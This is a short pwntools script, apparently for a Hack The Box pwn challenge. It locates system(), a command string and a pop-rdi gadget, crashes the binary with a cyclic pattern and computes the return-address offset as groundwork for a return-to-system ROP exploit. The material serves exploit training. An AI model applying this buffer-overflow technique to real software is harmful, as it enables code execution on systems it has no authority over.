
from pwn import *

#context.log_level = 'DEBUG'
context(os='linux', arch='amd64')

executable = '/home/kali/Downloads/htb-console'

#padding_length_flag = 24

elf = context.binary = ELF(executable)

log.info('Get Addresses')
info("%#x system", elf.symbols.system)
#info("%#x winner", elf.symbols.winner)

#info("%s symbols", elf.symbols)
#info("%s plt", elf.plt)
#info("%s got", elf.got)
#info("%s libs", elf.libs)

execute_string = next(elf.search(b'date'))
info("%#x execute string", execute_string)

rop = ROP(elf)
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
info("%#x POP RDI", POP_RDI)


log.info('Create IO')
#io = remote('', )
io = process(executable)

log.info('Send Command flag')
io.sendlineafter('>>', 'flag')

#log.info('Send Command hof')
#io.sendlineafter('>> ', 'hof')

payload = cyclic(200)

log.info('Send Payload')
io.sendlineafter('flag: ', payload)     #flag
#io.sendlineafter('name: ', payload)     #hof

io.wait()

core = io.corefile
stack = core.rsp
info("rsp = %#x", stack)
pattern = core.read(stack, 4)
info("cyclic pattern = %s", pattern.decode())
rip_offset = cyclic_find(pattern)
info("rip offset is = %d", rip_offset)

io.interactive()

